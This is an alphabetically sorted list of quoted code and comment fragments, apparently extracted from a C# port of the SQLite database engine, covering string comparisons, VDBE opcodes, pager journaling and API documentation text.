" sqlite3StrICmp( zDb, db.aDb[j].zName ) != 0 ) continue"
" sqlite3StrICmp( zLeft, ""freelist_count"" ) == 0"
" sqlite3StrICmp( zLeft, ""quick_check"" ) == 0"
" sqlite3StrICmp( zLeft, ""user_version"" ) == 0"
" sqlite3StrICmp( zTName, zTabName ) != 0 )"
" sqlite3StrICmp( zTabName, zTab ) != 0 )"
" sqlite3StrICmp( zType, ""INTEGER"" ) == 0"
" sqlite3StrNICmp( elem.pKey, pKey, nKey ) == 0 )"
" sqlite3StrNICmp( p.z.ToString(), zKeyText.Substring( aKeyword[j].i ), p.n ) == 0 )"
" sqlite3StrNICmp( pTab.zName, 7, ""altertab_"", 9 ) != 0 )"
" sqlite3StrNICmp( zSql, zIdx, ""create"", 6 ) == 0 )"
" sqlite3StrNICmp( zSql, zIdx, ""end"", 3 ) == 0 )"
" sqlite3StrNICmp( zSql, zIdx, ""explain"", 7 ) == 0 )"
" sqlite3StrNICmp( zSql, zIdx, ""temp"", 4 ) == 0 )"
" sqlite3StrNICmp( zSql, zIdx, ""temporary"", 9 ) == 0 )"
" sqlite3StrNICmp( zSql, zIdx, ""trigger"", 7 ) == 0 )"
" sqlite3StrNICmp( zText.Substring( iOffset[i] ), z, n ) == 0 )"
" sqlite3Utf16ByteLen(zSql, chars_parsed)"
" sqlite3Utf8Read( zString, ref zString ) == 0 )"
" sqlite3ValueText( pVal, enc ) != null )"
" sqlite3VdbeAddOp2( v, OP_Sort, iTab, addrBreak )"
" sqlite3VdbeAddOp2( v, aStart[bRev], iCur, addrBrk )"
" sqlite3VdbeAddOp2(v, OP_Null, 0, regRowset)"
" sqlite3VdbeMemGrow( pMem, pMem.n "
" sqlite3VdbeMemStringify( pIn1, encoding ) != 0 ) { goto no_mem"
" sqlite3VdbeMemStringify( pIn2, encoding ) != 0 ) { goto no_mem"
" sqlite3VdbeMemStringify(P,enc)) "
" sqlite3VdbeOpcodeHasProperty( pOut.opcode, OPFLG_JUMP ) )"
" sqlite3VdbeUnpackRecord() function above, which makes all"
" sqlite3ViewGetColumnNames( pParse, pTab ) != 0 )"
" sqlite3_aggregate_context() for the same aggregate function index,"
" sqlite3_backup_step(), we can guarantee that the copy finishes"
" sqlite3_column_XXX API, then set the return code of the statement to"
" sqlite3_column_blob(), or sqlite3_column_text16() first to force the result"
" sqlite3_column_bytes16(), and do not mix calls to sqlite3_column_text16()"
" sqlite3_column_text16(), causing a translation to UTF-16 encoding."
" sqlite3_column_type( pStmt, i ) != SQLITE_NULL )"
" sqlite3_create_collation, and not generated by synthCollSeq(),"
" sqlite3_errcode(), sqlite3_errmsg() and sqlite3_errmsg16()."
" sqlite3_errmsg(), possibly making IO errors easier to debug."
" sqlite3_interrupt() is called, then it might not have an opportunity"
" sqlite3_interrupt() routine has been called.  If it has been, then"
" sqlite3_load_extension( db, zFile, zProc, ref zErrMsg ) != 0 )"
" sqlite3_mutex_leave() is a NULL pointer, then all three routines"
" sqlite3_open() and sqlite3_open16(). The database filename ""zFilename"""
" sqlite3_open(), sqlite3_open16(), or sqlite3_open_v2()."
" sqlite3_os_init() when it invokes sqlite3_vfs_register(), but other"
" sqlite3_os_init().  Similarly, sqlite3_shutdown()"
" sqlite3_prepare() interface. According to the docs, this can only"
" sqlite3_release_memory() returns the number of bytes actually freed,"
" sqlite3_result()],"
" sqlite3_result_blob is the special constant SQLITE_STATIC, then SQLite"
" sqlite3_result_text16le(), and sqlite3_result_text16be() interfaces"
" sqlite3_step().  In the new version, the original SQL text is retained"
" sqlite3_value objects and they can be used interchangeably.  However,"
" sqlite3_value_text( argv[0] ) : """""
" sqlite3_value_text( argv[1] ) : """""
" sqlite3_value_text()), or for ensuring that values to be used as btree"
" sqlite_master table, has already been made by sqlite3StartTable()."
" sqlite_rename_table('CREATE INDEX i ON abc(a)', 'def')"
" sqlite_rename_table('CREATE TABLE abc(a, b, c)', 'def')"
" start of a transaction, and is thus usually less than a few thousand,"
" started putting files with the ""sqlite"" name in the c:/temp folder."
" starting at pg1, then it needs to be set for all of them. Because"
" state prior to the start of the transaction, so invoke the"
" state vector.  If writable static data is unsupported on the target,"
" state.  We need to rollback the statement transaction, if there is"
" statement above, and pSelect is NULL.  For the second form, pList is"
" statement only). For DETACH, set it to false (expire all existing"
" statement returns a column value, then the affinity of that"
" statement, see the comment on the selectExpand worker callback above."
" statement.  The module name has been parsed, but the optional list"
" statement. This is now set at compile time, rather than during"
" statements too, but it never hurts to play the odds)."
" statements.  For example, if the number of table steps greatly exceeds"
" statistics. When disabled, the following SQLite interfaces become "
" still have 'null' as the master journal pointer, so they will roll"
" still running, and a transaction is active, return an error indicating"
" store a boolean result (either 0, or 1, or NULL) in register P2."
" store it in the temporary table. If <expr> is a column, then use"
" store the most recent error code and, if applicable, string. The"
" stored in reg(P1), reg(P1"
" stored in u.zToken.  Instead, the integer values is written"
" stored with the in-memory representation of the schema, do"
" stored without allocating memory, then it is.  If a memory allocation"
" stores the blob of memory associated with cursor 1, etc."
" strcmp( zMasterPtr, zMaster ) == 0"
" strcmp(z, zName) == 0)"
" string is unicode, so use byte[] instead"
" string representation of the value. Then, if the required encoding"
" string that the register itself controls.  In other words, it"
" string, it means the main database is :memory: or a temp file.  In"
" strings, and stuff like that."
" strongly typed, but the typing is dynamic not static.  Type"
" struct TriggerStack has a ""pNext"" member, to allow linked lists to be"
" struct, an Expr struct with the EP_Reduced flag set in Expr.flags"
" struct, the contents of WhereInfo.a[], the WhereClause structure"
" structure is created and liked into the ""db"" structure if a"
" structure the flags byte is set to 0x02 or 0x0A, indicating an index"
" structure, return now. The remainder of this procedure cleans"
" structure, the second the error-code about to be returned by a pager"
" structure, then said structure defines the content and collating"
" structure.  If writable static data is unsupported on the target,"
" structure. Conceptually, a collating sequence consists of a name and"
" structures that describe the table, index, or view."
" structures. Each Mem struct may cache multiple representations (string,"
" sub-journal file is open too. If the main journal is not open,"
" sub-journal file now (if it is not already there), so that it will"
" sub-journal is implemented in-memory if pPager is an in-memory database,"
" sub-journal. If the subjInMemory argument is zero, then any required"
" subqueries in expressions, and subqueries used as FROM clause"
" subquery and is not a column value, then all of these functions return"
" subquery first and store the results in a temporary table, then"
" subquery gives a constant result, then iTable is -1.  If the subquery"
" subquery is the right term of a LEFT JOIN, then do not flatten."
" subroutines first, then put the control logic at the bottom.  Like this:"
" substr(name,%d"
" substr(sql,%d) "" "
" substr(sql,14) "" "
" substr(sql,14)"" "
" substr(sql,21) "" "
" substr(x,p1,p2)  returns p2 characters of x[] beginning with p1."
" succeeded.  If the random rowid does exist, we select a new one"
" succesfully copied, but there are still more pages to copy before the "
" successfully obtained, it is copied to "
" successfully, SQLITE_OK is returned and "
" such a table must be a simple name: ID.  But in SQLite, the table can"
" such as the list ""a,b,c"" in the following statements:"
" such buffer exists or there is no space left in it, this function falls"
" sufficient, however the user has the option of substituting a custom"
" supplied) and the value of Z is enclosed in double-quotes, then"
" sure ""nnn"" is not too be to avoid a denial of service attack when"
" sure it still operates correctly, verify that its count agrees with our"
" switches (-Os), gcc may align this Mem object on a 4-byte boundary"
" synthCollSeq( db, p ) != 0 )"
" system in a deadlocked state, then SQLITE_LOCKED is returned and no"
" szCell[0] = cellSizePtr(pPage, pCell)"
" szEntry], 0, szEntry)"
" szNew[1] : 0,"
" szNew[2] : 0,"
" szNew[3] : 0,"
" table and index root-pages in order, starting with the numerically"
" table because user table are not allowed to have the ""sqlite_"""
" table columns and result-set columns.  At the same time, do error"
" table or NULL. If it is NULL, then all attached databases are searched"
" table pTab has no temporary triggers, or is itself stored in the"
" table, and that lock is obtained in BtreeBeginTrans().  "
" table, it searches the list for the VTable that corresponds to the"
" table, then malloc space for and store the pCur.nKey bytes of key"
" table.  In other words, if the constraint is of the form:"
" tables in the join, then we are Debug.Assured that the index can be used"
" tables, the following information is attached to the Table.u.autoInc.p"
" target.  The first time this is called, pExpr is evaluated to compute"
" tell you that in a well-normalized database, you usually should"
" temporary database, NULL is returned."
" temporary tables, and P3>1 means used the corresponding attached"
" term of the form ""Y <op> X"" is added to the WHERE clause and"
" term that is an equivalent IN expression.  In other words, if the term"
" term until after the t2 loop of the join.  In that way, a"
" term.  That means that if the BETWEEN term is coded, the children are"
" termination condition ""abd""."
" test whether a file is readable and writable, or [SQLITE_ACCESS_READ]"
" text that describes the error, as either UTF-8 or UTF-16 respectively."
" text, it is up to the caller to get the encoding right."
" than Pager.dbSize, this means sqlite3PagerTruncateImage() was called to"
" than pMem2. Sorting order is NULL's first, followed by numbers (integers"
" than this value.  When this value reaches its maximum, a SQLITE_FULL"
" than zero, then this function is being called from within a"
" that P1 is currently pointing to, ignoring the ROWID on the P1 index."
" that all prior mallocs (ex: ""a"") worked too."
" that also occurred at the top level.  Within the body of a trigger,"
" that belong to the same connection. If there are, SQLITE_LOCKED is"
" that can go wrong with an insert, assuming p and i are valid."
" that case we do not support atomic multi-file commits, so use the"
" that column, if there is an AS clause.  If there is no AS clause"
" that if a malloc() fails in sqlite3_create_function(), an error code"
" that if the key from register P3 is a prefix of the key in the cursor,"
" that in a GROUP BY clause, the expression is evaluated twice.  Hence:"
" that is also read as part of the SELECT.  In the third form,"
" that is inside an explicit transaction, then the entire transaction"
" that is negative, zero, or positive if pC is less than, equal to,"
" that is not part of the temp.db schema, add a clause to the WHERE"
" that is read in pRes.  Return SQLITE_OK if everything worked, or an"
" that is the case, there is no point in having more than a few"
" that it took at the start of the transaction. Otherwise, the"
" that it uses the encoding ""enc"""
" that match the WHERE clause P4.  P2 is the ""force"" flag.   Always do"
" that matches pKey,nKey.  Return the data for this element if it is"
" that might be a hot journal.  Or, it could be that the journal is"
" that page might be marked as dirty.  This happens, for example, when"
" that reason, we always use the nRec value in the header."
" that sqlite3PagerWrite() is called, the state transitions to"
" that sqlite3_prepare() generates.  For example, if new functions or"
" that subset out, but there is no advantage to doing so."
" that the supplied string is nul-terminated, then there is a small"
" that we do not need it after all, the OpenEphemeral instruction"
" that when data is appended to a file, the data is appended"
" that writer, then the number of locks held by connections other"
" the  magic string found at the start of each journal header, return"
" the ""1st template""):"
" the ""op"" parameter to findTerm when we are resolving equality constraints."
" the FROM clause of the outer query.  Before doing this, remember"
" the FROM clause that has already been constructed.  ""p"" is NULL"
" the FuncDef is not ephermal, then do nothing."
" the OS driver, but the code to deal with those failure would not"
" the P1 database. If the vacuum has finished, jump to instruction"
" the PGHDR_NEED_SYNC flag is cleared, if the page is written to"
" the SELECT completes, it sets the EOF flag stored in regEof."
" the SQL statement, then this function only considers plans using the"
" the SQLite ""[PRAGMA cache_size]"" command. As with the bPurgeable parameter,"
" the SQLite core and the underlying operating system.  The ""vfs"""
" the SQLite-wrappers sqlite3Malloc()///sqlite3DbFree(db,ref  ).  Those wrappers"
" the WHERE clause, it might result in additional nested loops for"
" the [SQLITE_THREADSAFE] C preprocessor macro 1 or 2, mutexes"
" the [sqlite3_context] pointer, the results are undefined."
" the all terms are of the form ""table1.column=table2.column"".  It"
" the allocation.  If not, defragment."
" the argument.  If the argument is NULL, the return value is the string"
" the balance_shallower() and balance_deeper() procedures, neither of"
" the blob of data that it corresponds to. In a table record, all serial"
" the build, then none of the following routines, except for"
" the caller is responsible for calling //sqlite3DbFree(db, ) on the returned"
" the cell within the parent, even though it has been dropped."
" the close fails, we pause for 100 milliseconds and try again.  As"
" the column is a literal number, string or null. The sqlite3ValueFromExpr()"
" the commutation. So ""Y collate NOCASE op X"" becomes"
" the constraint occur in different orders, then the constraints are"
" the content of the new row, and the assemblied row record."
" the corresponding table b-tree. This makes things a bit more complicated,"
" the count does not include changes used to implement [REPLACE] constraints,"
" the current journal-mode (Pager.journalMode value), as follows:"
" the cursor is moved to a different row. Additionally, in auto-vacuum"
" the cursor is used to read a record.  That way, if no reads"
" the cursor, zero the BtCursor.info.nSize and BtCursor.validNKey"
" the database and the page is not in-memory, there is a potential"
" the database connection is created using [sqlite3_open()],"
" the database file is truncated (if required), and"
" the database file, it will do so using an in-memory journal.  "
" the database file, return the error code to the caller."
" the database file, so the playback operation can be skipped."
" the database image, it may need to be written to the sub-journal."
" the database name, the _table_ routines return the table name, and"
" the disk.  After the journal is safely on oxide, the changes to the"
" the end of its result set, then fall through to the next instruction."
" the error becomes persistent. Until the persisten error is cleared,"
" the expression is a variable (TK_VARIABLE), then Expr.token contains the"
" the extra entries had not yet made it safely to disk.  In such a case,"
" the first 0x00 byte. If nByte is not less than zero, return the"
" the first 0x00, whichever comes first)."
" the first byte past the 1GB boundary, 0x40000000) needs to occur"
" the first one after the nEq equality constraints in the index,"
" the following three values, optionally combined with the "
" the form ""<lhs> IN (SELECT ...)"". If the EP_xIsSelect bit is set in the"
" the freelist.  Except, the root of the principle table (the one on"
" the function is called. On subsequent calls, from sqlite3_reset(), nVar"
" the head of the list (last page to be recycled). However, if the"
" the header, then your custom library will not be able to read"
" the heap.  When WSD is unsupported, the variable declarations scattered"
" the height is greater than the maximum allowed expression depth,"
" the host architecture.  It is harmless, apart from the wasted memory,"
" the incompatibility right away, even running a full regression test."
" the index is listed as ""{}"".  If the primary key is used the"
" the index of the primary key as it appears in IDLIST, not as"
" the indices of tab2 are transfered to tab1 as well.  In so doing,"
" the journal file twice, but that is not a problem."
" the journal is synced (unless the atomic-write optimization is used),"
" the journal, it means that the journal might contain additional"
" the key and P2 is not zero, then jump to P2."
" the label is resolved to a specific address, the VDBE will scan"
" the latter case the index already exists on disk, which is why"
" the library atof() might want to use "","" as the decimal point instead"
" the limit and offset.  If there is no limit and/or offset, then"
" the lock (one of [SQLITE_LOCK_NONE], [SQLITE_LOCK_SHARED],"
" the lock. If the lock is obtained successfully, set the Pager.state"
" the malloc(), realloc() and free() provided by the standard C library."
" the memory prevents valgrind from complaining, so we are willing to"
" the memory subsystem are allowed, but no new callbacks will be"
" the move.  If no page gets moved, piMoved is set to 0."
" the mutexes are omitted.  Without the mutexes, it is not safe"
" the mutexes.  But for maximum safety, mutexes should be enabled."
" the nByte-th byte, whichever comes first. If the caller knows"
" the name by adding an ""sqlite_altertab_"" prefix.  By adding this"
" the name of a folder (a.k.a. directory), then all temporary files"
" the new pager object. If an error occurs, "
" the number of bytes in the memory buffer, and the minimum allocation size."
" the number of table searches or result rows, that would tend to indicate"
" the number, meaning, and operation of all subsequent parameters."
" the opaque structure named ""sqlite3"".  It is useful to think of an sqlite3"
" the other hand, this routine is never called if we are already in"
" the output, which is incorrect."
" the outside of the total string.  Additionally, if the parameter in the"
" the page now, instead of at rollback, because we can better deal"
" the page number of the root of the table.  After this routine returns,"
" the page, 1 means the second cell, and so forth) return a pointer"
" the pager is in error-state, then this call is a no-op."
" the parsing if P2 is true.  If P2 is false, then this routine is a"
" the permanent table is hidden by the TEMP table, we can also"
" the persistent error occurred, then the rollback journal may need"
" the pointer-map was used to obtain the value for pPgnoNext), then"
" the previous N Push operations.  In other words, restore the cache"
" the previous call, as the overflow cell data will have been"
" the process, or if it is the first time sqlite3_initialize() is invoked"
" the processing calls for the query to abort, this subroutine"
" the query attempt returns an IO error, the IO error code is returned"
" the registers in the nReg registers beginning with iReg, then"
" the requested locking level, this routine is a no-op."
" the resetFlg is true, then the highest instantaneous value is"
" the result of a constraint, malloc() failure or IO error) then"
" the result set for the compound-select statement ""p"".  Return NULL if"
" the result, [sqlite3_free()] is called on the input string. {END}"
" the result, result columns may become dynamic if the user calls"
" the right - the ""B"" select"
" the rollback at this time. Instead, pager_unlock() is called. The"
" the rollback journal, the unlock is not performed and there is"
" the root page is empty, but still exists."
" the rowset object for P3, as it is guaranteed not to contain it,"
" the same as binding a NULL value to the column. If the ""i"" parameter is"
" the savepoint is active, then iHdrOffset is set to the byte offset"
" the schema loaded, even if errors occurred. In this situation the"
" the schema of iDb is loaded. This is because, at the start of"
" the second is page 2, and so forth.  A page number of zero indicates"
" the seek, so covert it. "
" the source and destination databases, where nPage is the value of the "
" the special ""DROP TABLE/INDEX"" case, the extended error code is just "
" the special value [SQLITE_STATIC], then SQLite assumes that the"
" the specified file. This is almost always 512 bytes, but may be"
" the sqlite3_exec() call below, SQLite will invoke"
" the statement, where N is the second function argument."
" the sub-journal is not already open, then it will be opened here."
" the table b-tree corresponding to the index b-tree being written, this"
" the table has a cursor number of ""_base"".  pIdx is an index on pTab."
" the table has any PRIMARY KEY, INTEGER or otherwise."
" the table name is not fully qualified, i.e.:"
" the table need never be read from. This is a performance boost,"
" the table take priority. For example, if zType is 'BLOBINT',"
" the table.  If a table has no INTEGER PRIMARY KEY, then a random rowid"
" the transaction or unlock the database, it just restores the"
" the transaction, for each page restored this routine is called."
" the update or insert statement.  If rowidChng is false, it means that"
" the value held in P3, jump to register P2. Otherwise, insert the"
" the value of the schema-version and user-version, respectively. Both"
" the value, then jump to the end of the test code. The target"
" the version number) and changes its name to ""sqlite3.h"" as"
" the way the ""idxlist"" non-terminal is constructed by the parser,"
" the xFetch() method, it will be zeroed. If the discard parameter is"
" the zero-terminator.  Note that the name length limit is in bytes, not"
" them A, B, and C. The result is also a string which is derived"
" them, respectively.  So the maximum header length results from a"
" then again, we might not..."
" then assume a default value of ""now"" for argv[0]."
" then it is copied to the output buffer exactly as it is. Otherwise,"
" then pgno is returned. So (pgno==PTRMAP_PAGENO(pgsz, pgno)) can be"
" then return TRUE.  If pIdList==NULL, then it is considered a"
" then so is B.  In other words, we never have a case where:"
" then the BLOB handle is marked as ""expired""."
" then the seek is not possible, so jump to P2 "
" then there is no divider cell in apCell[]. Instead, the divider"
" there are no IN operators in the constraints, the ""addrNxt"" label"
" there are no outstanding page references, and"
" there is a hot-journal left in the file-system, the next connection"
" there is no ORDER BY, we will get an error. "
" there is no consistency, we will define our own."
" there is no default collation type, return 0."
" there is such an index, and it has less columns than the table"
" there was a collision, check to see if it's already "
" they return.  Hence, the calling function can deallocate or"
" they take, and what they do are all subject to change without notice."
" thing written to a journal file. If the pager is in full-sync mode, the"
" this assert() from failing, when building with SQLITE_DEBUG defined"
" this case the whole cell needs to be parsed, a buffer allocated"
" this connection obtained the exclusive lock above. Or, it"
" this function is called, it is a no-op."
" this happened, the correct behaviour would be to restore the current"
" this happens, then some other thread may delete the in-memory"
" this happens. TODO: Really, this doesn't need to be cleared"
" this is happening, the database may become corrupt."
" this overflow cell is present, it must be the cell with"
" this routine is a no-op.  If the function does not exist, then create"
" this routine is used, it does not hurt to get an extra FALSE - that"
" this routine was called, then set pRes=1."
" this routine would return the string ""VARIANT"" for the second result"
" this routine, that other busy handler is cleared."
" this transaction, it may be written to the database file before"
" this transaction, the pager is running in exclusive-mode and is"
" this virtual-table, if one has been created, or NULL otherwise."
" this way, the final OP_Halt is not appended and other initialization"
" this, each thread can obtain exclusive use of the [database connection] D"
" though fast and simple, catches the mostly likely kind of corruption."
" though if the INSTEAD OF trigger makes changes of its own, those changes "
" though, and if a failure occurs at this point it will eventually"
" thought.  If a power failure occurs while the journal is being written,"
" thread has finished the initialization process, then the subsequent"
" thread holds the mutex and it cannot be obtained, return SQLITE_BUSY."
" threads while sqlite3_config() is running.  Furthermore, sqlite3_config()"
" three file descriptors, the database file name and the journal"
" through the set members, skipping any duplicates. In this case an"
" to ""bitmap indices"" in other data_base engines."
" to P2.  If an entry does existing, fall through.  The cursor is left"
" to P2. Otherwise, copy the rowid of the conflicting record to"
" to a CREATE TABLE statement.  In particular, this routine is called"
" to a TEMP table at the SQL level, or to a table opened by"
" to a malloc() or IO failure), clear the bit in the pInJournal[]"
" to a non-NULL pointer, then the sqlite3_io_methods.xClose method"
" to a valid entry, pSize is set to 0."
" to allocate, regardless of whether it has leaves."
" to an OP_Function, OP_AggStep or OP_VFilter opcode. This is used by"
" to an SQL index, then P3 is the first in an array of P4 registers"
" to an object in a different database, an error message is added to"
" to an overflow page, insert an entry into the pointer-map"
" to be invoked whenever a row is updated, inserted or deleted."
" to be of the form ""<rowid> IN ("
" to be supported.  However, new applications should avoid"
" to by pnHeight, the second parameter, then set pnHeight to that"
" to by zPathname, length nPathname. Or, if this is a temporary file,"
" to call releasePage() on ppChild exactly once. If an error occurs,"
" to clean up any outstanding resources before process shutdown, if required."
" to correct this in all situations, so this macro was introduced."
" to create an empty, zero-filled blob in which to read or write using"
" to determine whether or not a hot-journal file exists, the IO error"
" to enter a mutex.  If another thread is already within the mutex,"
" to enter a mutex. {H17024} If another thread is already within the mutex,"
" to evaluate ""IN (SELECT ...)"" and similar clauses."
" to exist, in case the transaction needs to roll back.  We allocate"
" to find the actual table type, so call it ""TEXT"".  This is really"
" to find the underlying cause of the problem. With the ""v2"" prepare"
" to fit in a 32-bit integer, return 1 and put the value of the integer"
" to fit in a signed 32-bit integer, return 0 and leave pValue unchanged."
" to get a read lock but fails, the script terminates with an"
" to instruction P2. Otherwise, the rowid of the conflicting index"
" to maintain backwards compatibility with older versions of SQLite,"
" to make sure the journal file has actually been created, then call"
" to move to, then just return without doing any work "
" to page number pOvfl was obtained, then ppPage is set to point to that"
" to perform various actions, the authorizer callback is invoked to"
" to read ""usableSize/4-2"" instead of ""usableSize/4-8""."
" to roll the journal back, the database could be corrupted.  The additional"
" to routines like [sqlite3_value_int()], [sqlite3_value_text()],"
" to some integer key column of a table B-Tree. In this case, use an"
" to sqlite3PagerWrite().  In other words, return TRUE if it is ok"
" to sqlite3_free() is harmless.  After being freed, memory"
" to store the copy of expression p, the copies of p->u.zToken"
" to test for the existence of a file, or [SQLITE_ACCESS_READWRITE] to"
" to the ""sqlite3Autoext"" state vector declared above."
" to the ""sqlite3Hooks"" state vector declared above."
" to the ""sqlite3Prng"" state vector declared above."
" to the ""sqlite3Stat"" state vector declared above."
" to the AS-name of one of the terms of the expression list.  If it is,"
" to the caller in local variables zDataType, zCollSeq, notnull, primarykey"
" to the database file, then the IO error code is returned. If data"
" to the following instruction.  But if the cursor advance was successful,"
" to the following instruction.  But if the cursor backup was successful,"
" to the label ""dest"" if the expression is false but execution"
" to the label ""dest"" if the expression is true but execution"
" to the pointer-map. If we write nothing to this pointer-map slot,"
" to the right and the left are evaluated, they use the correct"
" to the standard form of ""X <op> <expr>""."
" to the start of it. If there are active savepoints, open the sub-journal"
" to the table being operated on by INSERT, UPDATE, or DELETE.  The"
" to the time.  The "".FFF"" may be omitted.  The "":SS.FFF"" may be"
" to this function. Otherwise, it is always set to zero."
" to use a one-pDebug.Ass algorithm, determine if this is appropriate."
" to using its default memory allocator (the system malloc() implementation),"
" to version 2.8.7, all this code was combined into the vdbe.c source file."
" to whatever their local counterparts contain. If an error did occur,"
" to will have been initialized, either during the current invocation or"
" to xFetch, according to the following table:"
" token (i.e. ""5"", ""5.1"", ""'a string'""). If the expression can"
" token is read and 'dist' equals 2, the condition stated above"
" token.z was originally in ""..."" "
" total number of pages that participate, including the target page and"
" tracks memory usage, for example.</dd>"
" transaction (errors including [SQLITE_FULL], [SQLITE_IOERR],"
" transaction is already guaranteed, but some stray 'cold' journals"
" transaction is rolled back. If eOp is SAVEPOINT_RELEASE, then the"
" transaction is started, meaning that no other process is allowed"
" transaction is then committed, so the SQL level never knows it was"
" transaction on this file. And, obviously, for this to be so there"
" transaction open on the vacuum database, but not on the main database."
" transaction), then SQLite may become confused when doing the"
" transaction, a problem comes up. If the page is not journalled when"
" transaction, then there cannot be any savepoints."
" transaction, these accesses need to be made via the same database "
" transaction. If it does not, then the BtShared.isPending variable"
" transaction. If there currently exists a writer, and p is not"
" translated into a unique ID for the row.  But on a BEFORE trigger,"
" translations, if any."
" tree needs to be balanced, and if so calls the appropriate balancing"
" tree refered to by this, the parent select. The child select"
" tree, in other words, when the new entry will become the largest"
" tree.  For example, in:"
" tricky as the leaf node may be underfull, and the internal node may"
" trigger context.  If a trigger fires from the top level, a"
" trigger has its own context, so that lastRowid can be updated inside"
" trigger] contexts.  However,"
" true also. In this case the lock is required, but it is too difficult"
" true, then create a new entry. Otherwise return NULL."
" truncated to zero after this function returns, so it doesn't"
" truncated.  And to reduce the number of memory allocations, sometimes"
" truncating or partially zeroing it, so that it cannot be used"
" trunk page in the free-list is full, then this page will become a"
" trusted. Now that the pager file is unlocked, the contents of the"
" two TESTs where the TESTs have the same batch nubmer, then the"
" two is that the second parameter, the name of the (scalar) function or"
" two or more Expr objects will be stored in a single memory allocation,"
" two or more separate queries using UNION, UNION ALL, EXCEPT, or"
" types are stored at the start of the record, and the blobs of data at"
" unless p->nOp>0.  This is because in the absense of SQLITE_OMIT_TRACE,"
" unlock operation fails as well, then the first error code related"
" unprepared to deal with extension loading, and as a means of disabling"
" unqualified name for a new schema object (table, index, view or"
" unsynced portion of the main journal file, then it is not safe"
" until all data is exhausted then jump to the ""end"" labe.  AltB, AeqB,"
" up, which may be queried by sqlite3_backup_remaining(), and the total"
" usableSize/4 - 2 entries, not usableSize/4 - 8 entries as we have"
" use by SQLite, code that links against SQLite is"
" use of alloca() to obtain space for large automatic objects.  By default,"
" use these hints to generate better code, sometimes."
" used as the P4 operand, they will be more readable."
" used by the backup operation, then the backup will be transparently"
" used for the scan. If not, then query compilation has failed."
" used to contain that setup code.  The ""VVA"" acronym stands for"
" used to store temporary tables, and any additional database files"
" used, this call will not create the journal file or perform any"
" usedAsColumnCache( pParse, i, i "
" uses it to implement the blob_read(), blob_write() and"
" using [sqlite3_malloc()], either directly or indirectly.  The"
" using gcc, force nullMem to be 8-byte aligned using the magical"
" using persistent journals, then this function is a no-op."
" using the ""pNext"" member) referenced by the ""step_list"" member of the"
" using these functions, we are not going to tell you what they do."
" usual case.  If the term has a alias, then pAlias points to the"
" usually, or sometimes subexpressions separated by OR."
" valid and which are not, so the entire process needs to be restarted."
" valid entry.  In other words, the calling procedure must guarantee"
" valid input flags for sqlite3_open_v2() are SQLITE_OPEN_READONLY,"
" valid page entries in the journal.  In most cases, you can compute the"
" validated the freelist.  Given that the freelist is valid, there"
" value in order to correctly evaluate expressions like ""X IN (Y, Z)""."
" value in register P3 is not NULL, then this routine is a no-op."
" value of ""op"" as follows:"
" value of mxPage.  If mxPage is negative, the pager will"
" value of x, the only row required)."
" value passed as the second parameter is the total number of savepoints,"
" value returned is in pages, not in bytes.</dd>"
" value stored as part of the in the in-memory schema representation,"
" value, all remaining source pages are copied. If the required pages are "
" value, it is advisory only."
" value, it is set to the number of columns in the table, or to the"
" value, it is set to the number of columns in the table."
" value, jump immediately to P2."
" value.  If it is a string or blob, try to convert it to a double."
" value.  TOTAL never fails, but SUM might through an exception if"
" values and K is the total number of rows, then the integer is computed"
" values in the record, extract a NULL."
" values, resulting in a positive value.  Then take the"
" variable name. Finally, if the expression is an SQL function (TK_FUNCTION),"
" vdbe program will take advantage of the various transaction,"
" verify this, but Frank seems to know what he is talking about"
" version 3.6.0, we require them to be fixed."
" version, the original SQL text is not saved in the prepared statement"
" versions of these routines, it should at least provide stubs that always"
" virtual module tables in this case, so return SQLITE_LOCKED."
" want to analyze these virtual terms, so start analyzing at the end"
" was an OOM error, we would never reach this point. "
" was created, or added later to the table definition by an ALTER TABLE"
" was enabled at compile time, and if this transaction meets the"
" was invoked incorrectly by the application.  In that case, the"
" was pDebug.Assed to this function to implement a ""SELECT min(x) ..."""
" was such a clause and the named index cannot be found, return"
" was when the transaction started, not as it was when ""SAVEPOINT sp"""
" way when we go to enter all the mutexes, we can enter them"
" way, the remainder of the function does not have to deal with any"
" we cannot simply return the error to the caller. Instead, abort"
" weekday N where 0==Sunday, 1==Monday, and so forth.  If the"
" well put it first in the join order.  That way, perhaps it can be"
" well-formed database file, then SQLITE_CORRUPT is returned."
" when A already has a read lock, we encourage A to give up and let B"
" when the ""TEMP"" or ""TEMPORARY"" keyword occurs in between"
" when this routine is invoked, then this routine is a harmless no-op."
" where OP is =, "
" where X is a column name and <op> is one of certain operators,"
" where multiple cases go to the same block of code, testcase()"
" where table is a database table, not a sub-select or view. If the query"
" where too large (they were larger than the ""sz"" parameter to"
" which appear on the RHS of the rule, but which are not used"
" while this routine is running.  Hence, we do not need to hold"
" while( (pStmt = sqlite3_next_stmt(db, 0))!=0 ){"
" wildcard.  But if we increment '@', that will push it into the"
" will be accessed by the VM, and we could use Vdbe.btreeMask to figure"
" will be read from the database file, which may or may not be"
" will be set for TEMP  databases, journals and for subjournals."
" will not fit, then make a copy of the cell content into pTemp if"
" will sleep multiple times until at least ""ms"" milliseconds of sleeping"
" windows and unix.  I'm guessing that isn't likely to happen, but by"
" with 2.0.0, SQLite no longer uses GDBM so this command has"
" with a NULL pointer, so we mark the NULL test with ALWAYS()."
" with a particular database connection.  Hence, schema information cannot"
" with database connection pDb.  If pStmt is NULL, return the first"
" with entries for the new page, and any pointer from the"
" with no indexes using a single prepared INSERT statement, bind()"
" with pPager. Normally, this is calculated as (<db file size>/<page-size>)."
" with page size SQLITE_DEFAULT_PAGE_SIZE. However, based on certain"
" with root-page iRoot. Usually, this is called just before cursor"
" with table iTable, allocate one and link it into the list."
" with that key does not exist in table of P1, then jump to P2."
" with that name.  If there is no variable with the given name,"
" with the ""out2-prerelease"" tag.  Such opcodes have a single"
" with the ""v2"" interface.  If you prepare all of your SQL statements"
" with the SQLITE_ENABLE_ATOMIC_WRITE macro defined. In this case,"
" with the TK_ALL operator for each """
" with the [SQLITE_OPEN_CREATE] flag, which are both directly"
" with the [SQLITE_OPEN_NOMUTEX] or [SQLITE_OPEN_FULLMUTEX] flags,"
" with the verbs [SQLITE_CONFIG_SINGLETHREAD], [SQLITE_CONFIG_MULTITHREAD],"
" with values between 1 and iSize, inclusive."
" within a callback to a virtual table xSync() method. If it is, the error"
" within the shared library, and closing the shared library."
" without data loss, then jump immediately to P2, or if P2==0"
" without floating point support, rT will have"
" without this code, their parser segfaults.  I'm not sure what there"
" without this option, LFS is enable.  But LFS does not exist in the kernel"
" words, at most 13 bytes. Hence the pSpace buffer must be at"
